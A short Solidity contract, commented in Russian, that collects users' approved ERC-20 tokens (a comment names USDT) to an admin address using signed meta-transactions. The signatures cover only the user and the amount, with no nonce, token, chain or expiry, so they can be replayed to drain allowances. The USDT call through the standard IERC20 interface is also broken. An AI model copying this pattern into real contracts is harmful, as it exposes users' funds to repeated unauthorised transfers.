pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract MetaTransactionCollector {
    using ECDSA for bytes32;

    address public admin;

    // Событие для логирования переводов
    event TransferExecuted(address indexed user, uint256 amount, address indexed admin);

    constructor(address _admin) {
        admin = _admin;
    }

    // Функция для выполнения мета-транзакции
    function executeTransfers(
        address token,
        address[] calldata users,
        uint256[] calldata amounts,
        bytes[] calldata signatures
    ) external {
        require(users.length == amounts.length, "Users and amounts length mismatch");
        require(users.length == signatures.length, "Users and signatures length mismatch");

        for (uint256 i = 0; i < users.length; i++) {
            // Проверка подписи
            bytes32 messageHash = keccak256(abi.encodePacked(users[i], amounts[i]));
            address signer = messageHash.toEthSignedMessageHash().recover(signatures[i]);

            require(signer == users[i], "Invalid signature");

            // Выполнение перевода USDT
            IERC20(token).transferFrom(users[i], admin, amounts[i]);

            emit TransferExecuted(users[i], amounts[i], admin);
        }
    }
}